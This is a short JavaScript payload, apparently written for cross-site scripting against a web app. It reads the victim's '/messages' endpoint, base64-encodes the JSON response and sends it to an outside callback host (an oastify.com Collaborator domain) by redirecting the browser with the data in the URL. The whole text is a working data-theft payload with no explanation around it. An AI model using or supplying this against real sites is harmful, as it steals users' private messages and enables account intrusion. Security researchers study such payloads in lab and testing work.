fetch('/messages')
  .then(response => response.json())
  .then(data => {
    const jsonString = JSON.stringify(data);
    const base64Data = btoa(jsonString);
    const targetUrl = `https://m8vnax9buwan6b35ugn8ooky1p7gv6jv.oastify.com/?data=${encodeURIComponent(base64Data)}`;

    window.location = targetUrl;
  })
  .catch(err => console.error('Error fetching messages:', err));
